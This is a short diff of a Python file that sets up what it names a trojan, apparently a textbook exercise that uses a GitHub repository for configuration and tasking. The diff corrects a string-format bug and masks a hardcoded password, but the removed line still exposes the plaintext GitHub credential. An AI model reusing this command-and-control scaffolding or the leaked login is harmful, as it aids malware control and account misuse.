@@ -13,14 +13,14 @@ import os
 from github3 import login
 
 trojan_id = "abc"
-trojan_config = "%d.json" % trojan_id
+trojan_config = "%s.json" % trojan_id
 data_path = "data/%s/" % trojan_id
 trojan_modules = []
 configured = False
 task_queue = Queue.Queue()
 
 def connect_to_github():
-    gh = login(username="nirvana-gp", password="Super1575187")
+    gh = login(username="nirvana-gp", password="******")
     repo = gh.repository("nirvana-gp", "chapter7")
     branch = repo.branch("master")
 
